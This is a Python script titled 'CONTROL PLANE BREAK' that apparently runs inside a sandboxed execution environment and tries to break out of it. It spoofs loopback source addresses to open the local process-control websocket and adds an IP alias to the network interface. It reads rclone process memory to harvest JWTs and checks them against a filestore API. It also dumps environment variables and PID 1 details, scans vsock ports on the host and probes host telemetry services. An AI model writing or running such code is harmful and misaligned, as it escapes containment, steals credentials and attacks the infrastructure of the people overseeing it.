#!/usr/bin/env python3
# mediafit.py v6.1 -- CONTROL PLANE BREAK
# A) 127.0.0.x clean bypass + eth0:0 secondary alias   B) egress sanity
# C) full WS session (3 auth variants x 2 specs)        D) /proc/1 recon
# E) vsock host scan                                    F) host:5005 OTLP probe
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re

OUT   = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS, SRC_LOOP = "eth0", "192.0.2.3", "127.0.0.2"
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
R = []
def w(s=""): R.append(str(s))
def sec(t): w(); w("="*70); w("### "+t); w("="*70)

def sh(c, t=8):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e:
        return "ERR:"+repr(e)

def can_bind(ip):
    try:
        t = socket.socket(socket.AF_INET, socket.SOCK_STREAM); t.bind((ip, 0)); t.close()
        return True
    except Exception:
        return False

# ---------------- websocket ----------------
def ws_handshake(host, port, src, timeout=2.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        if src: s.bind((src, 0))
        s.connect((host, port))
    except Exception as e:
        return "ERR", None, repr(e)
    try:
        key = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % (host, port, key)).encode())
        head = b""
        while b"\r\n\r\n" not in head and len(head) < 4096:
            c = s.recv(1024)
            if not c: break
            head += c
        first = head.split(b"\r\n")[0].decode(errors="replace")
        return ("OPEN" if b" 101 " in head.split(b"\r\n")[0]+b" " else "REJECT"), s, first
    except Exception as e:
        try: s.close()
        except Exception: pass
        return "ERR", None, repr(e)

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81" + bytes([0x80 | n])
    elif n < 65536: h = b"\x81" + bytes([0x80 | 126]) + struct.pack(">H", n)
    else:           h = b"\x81" + bytes([0x80 | 127]) + struct.pack(">Q", n)
    s.sendall(h + m + bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try:
        h = s.recv(2)
    except socket.timeout:
        return None, b""
    except Exception:
        return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, masked = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        mk = s.recv(4) if masked else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln - len(d))
            if not c: break
            d += c
        if masked and len(mk) == 4:
            d = bytes(b ^ mk[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e:
        return "err", repr(e).encode()

def ws_transcript(s, label, dur=7.0):
    t0 = time.time()
    while time.time() - t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close":
            w("      [%s] << server closed" % label); return
        tag = {1: "TEXT", 2: "BIN", 8: "CLOSE", 9: "PING", 10: "PONG"}.get(op, "OP%s" % op)
        w("      [%s] << %s(%d) %s" % (label, tag, len(d),
          d.decode(errors="replace")[:600].replace("\n", " | ")))

def spec(pid, cmd, args, env=None, clear=False, cwd="/tmp", tmo=15,
         uid=None, gid=None, mem=None, reuse=True):
    cr = {"cmd": cmd, "args": args, "env": env or {}, "cwd": cwd,
          "rows": 24, "cols": 80, "timeout": tmo, "clear_env": clear,
          "allow_process_id_reuse": reuse}
    if uid is not None: cr["uid"] = uid
    if gid is not None: cr["gid"] = gid
    if mem is not None: cr["memory_limit_bytes"] = mem
    return {"process_id": pid, "create_req": cr}

def ws_create(host, port, src, auth, sp, label):
    st, s, first = ws_handshake(host, port, src)
    w("  [%s] handshake=%-6s src=%-11s %s" % (label, st, str(src), first))
    if st != "OPEN":
        if s: s.close()
        return st
    try:
        if auth == "fake":
            ws_send(s, "a.b.c"); time.sleep(0.25)
        elif auth == "rclone" and RCLONE_JWT:
            ws_send(s, RCLONE_JWT); time.sleep(0.25)
        w("      [%s] >> %s" % (label, json.dumps(sp)[:300]))
        ws_send(s, json.dumps(sp))
        ws_transcript(s, label, 7.0)
    except Exception as e:
        w("      [%s] ERR %r" % (label, e))
    finally:
        try: s.close()
        except Exception: pass
    return "OK"

# ---------------- ip alias (keeps primary) ----------------
SIOCGIFADDR, SIOCSIFADDR, SIOCSIFNETMASK = 0x8915, 0x8916, 0x891c
def _ifr(ifname, ip=None):
    nm = ifname.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm + b"\x00" * 24
    return nm + struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
                            socket.inet_aton(ip), b"\x00" * 8) + b"\x00" * 8

def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    err = ""
    for nm in (ifname + ":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip):
                return "ok via " + nm
        except OSError as e:
            err = repr(e)
    return "fail " + err

# ---------------- vsock ----------------
def vsock_probe(cid, port, timeout=0.09):
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((cid, port)); s.close(); return True
    except Exception:
        return False

def vsock_http(cid, port, method, path, body=None, ctype=None, timeout=3.0):
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((cid, port))
        req = "%s %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n" % (method, path)
        if body is not None:
            req += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype or "application/json", len(body))
        req += "\r\n"
        s.sendall(req.encode() + (body.encode() if body else b""))
        d = b""
        try:
            while len(d) < 2048:
                c = s.recv(1024)
                if not c: break
                d += c
        except socket.timeout: pass
        s.close()
        return d
    except Exception as e:
        return repr(e).encode()

# ---------------- token harvest (best effort) ----------------
RCLONE_JWT = ""
def harvest():
    global RCLONE_JWT
    found = set()
    pids = []
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            cl = open("/proc/%s/cmdline" % p, "rb").read().replace(b"\x00", b" ").decode(errors="replace")
        except Exception: continue
        if "rclone" in cl: pids.append(int(p))
    for pid in pids:
        try:
            maps = open("/proc/%d/maps" % pid).read().splitlines()
            f = open("/proc/%d/mem" % pid, "rb", buffering=0)
        except Exception: continue
        buf = b""
        for ln in maps:
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m: continue
            a, b = int(m.group(1), 16), int(m.group(2), 16)
            if b - a > 8 * 1024 * 1024: continue
            try:
                f.seek(a); buf += f.read(b - a)
            except Exception: continue
        f.close()
        for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}", buf):
            found.add(mm.group(0).decode())
    def fix(t):
        p = t.split(".")
        if len(p) == 3 and len(p[2]) > 86: p[2] = p[2][:86]
        return ".".join(p)
    good = []
    for t in found:
        t2 = fix(t)
        try:
            import urllib.request as ur
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/listDirectory",
                            data=json.dumps({"path": "/"}).encode(),
                            headers={"Content-Type": "application/json",
                                     "Connect-Protocol-Version": "1",
                                     "Authorization": "Bearer " + t2})
            with ur.urlopen(rq, timeout=6) as r:
                if r.status == 200: good.append(t2)
        except Exception: pass
    if good: RCLONE_JWT = good[0]
    return len(found), len(good), pids

# ===================== RUN =====================
def main():
    sec("0. FACTS")
    w("kernel : " + sh("uname -a").strip())
    w("cmdline: " + sh("cat /proc/1/cmdline | tr '\\0' ' '").strip())
    w("bind   : 192.0.2.2=%s 192.0.2.3=%s 127.0.0.2=%s" %
      (can_bind("192.0.2.2"), can_bind("192.0.2.3"), can_bind(SRC_LOOP)))

    sec("A. CLEAN BYPASS MATRIX  (no interface change)")
    hits = []
    for src in (SRC_LOOP, "127.0.0.3", "127.5.5.5", "192.0.2.3", "192.0.2.9"):
        for port in (2024, 2025):
            st, s, first = ws_handshake("127.0.0.1", port, src)
            w("  src=%-11s -> 127.0.0.1:%-5d %-6s %s" % (src, port, st, first))
            if st == "OPEN": hits.append((src, port))
            if s: s.close()
    w()
    w("  ---- secondary alias fallback (keeps 192.0.2.2) ----")
    w("  add_secondary: " + add_secondary(IFACE, ALIAS))
    w("  bind check: 192.0.2.2=%s 192.0.2.3=%s" % (can_bind("192.0.2.2"), can_bind("192.0.2.3")))
    for src in (ALIAS, "192.0.2.2"):
        st, s, first = ws_handshake("127.0.0.1", 2024, src)
        w("  src=%-11s -> 127.0.0.1:2024 %-6s %s" % (src, st, first))
        if s: s.close()

    sec("B. EGRESS SANITY after address changes")
    for host in ("160.79.104.10",):
        try:
            s = socket.create_connection((host, 443), 6)
            s.sendall(b"GET / HTTP/1.1\r\nHost: api.anthropic.com\r\nConnection: close\r\n\r\n")
            w("  %s:443 -> %s" % (host, s.recv(160).decode(errors="replace").split("\r\n")[0]))
            s.close()
        except Exception as e:
            w("  %s:443 ERR %r" % (host, e))

    sec("C. TOKEN HARVEST (best effort)")
    try:
        n, g, pids = harvest()
        w("  rclone pids=%s  raw_tokens=%d  valid=%d" % (pids, n, g))
        w("  using=" + (RCLONE_JWT[:60] + "..." if RCLONE_JWT else "(none)"))
    except Exception as e:
        w("  ERR " + repr(e))

    sec("D. WS SESSION  <<< THE DECISIVE TEST >>>")
    best = (SRC_LOOP if can_bind(SRC_LOOP) else (hits[0][0] if hits else ALIAS))
    w("  chosen source: %s" % best)
    ENVD = "cat /proc/self/environ | tr '\\0' '\\n' | sort"
    specs = [
        ("env_dump",  spec("mf_env", "/bin/sh", ["-c", ENVD], cwd="/tmp", tmo=20)),
        ("ids_uname", spec("mf_id", "/bin/sh", ["-c", "id; uname -r; hostname; readlink /proc/1/exe"], tmo=20)),
    ]
    for auth in ("none", "fake", "rclone"):
        for nm, sp in specs:
            ws_create("127.0.0.1", 2024, best, auth, sp, "%s/%s" % (auth, nm))

    sec("E. PROC1 RECON")
    for f in ("/proc/1/cmdline", "/proc/1/environ", "/proc/1/status", "/proc/1/mountinfo"):
        out = sh("tr '\\0' '\\n' < %s 2>&1 | head -40" % f)
        w("  --- %s ---" % f); w("  " + out.strip()[:900].replace("\n", "\n  "))

    sec("F. VSOCK HOST SCAN (cid=2)")
    ports = sorted(set(list(range(1, 1025)) + list(range(4900, 5100)) +
                       [15004, 15005, 15010, 2024, 2025, 5001, 5002, 5005, 8080, 9090]))
    live = [p for p in ports if vsock_probe(2, p)]
    w("  live on host: %s" % live)

    sec("G. HOST:5005 PROBE (telemetry ingest on the HOST)")
    otlp = json.dumps({"resourceMetrics": [{"resource": {"attributes": [
        {"key": "service.name", "value": {"stringValue": "mediafit"}}]},
        "scopeMetrics": [{"scope": {"name": "mf"}, "metrics": [{"name": "mf.t",
        "gauge": {"dataPoints": [{"asDouble": 1.0, "timeUnixNano": str(int(time.time()*1e9))}]}}]}]}]})
    for p in live:
        for m, path, body, ct in (("GET", "/", None, None),
                                  ("POST", "/v1/metrics", otlp, "application/json"),
                                  ("POST", "/v1/logs", otlp, "application/json"),
                                  ("POST", "/v1/traces", otlp, "application/json")):
            d = vsock_http(2, p, m, path, body, ct)
            w("  %s:%d %-4s %-12s -> %s" % ("cid2", p, m, path,
              d[:200].decode(errors="replace").replace("\r\n", " | ")))

    sec("VERDICT")
    w("  clean bypass src .......... %s" % best)
    w("  101 Switching Protocols ... %s" % any(p == 2024 for _, p in hits))
    w("  alias kept primary ........ %s" % (can_bind("192.0.2.2") and can_bind(ALIAS)))
    w("  host vsock services ....... %s" % live)
    w("  rclone token valid ........ %s" % bool(RCLONE_JWT))

try:
    main()
except Exception as e:
    w(); w("FATAL " + repr(e))
finally:
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R) + "\n")
        print("written " + OUT)
    except Exception as e:
        print("write fail " + repr(e)); print("\n".join(R))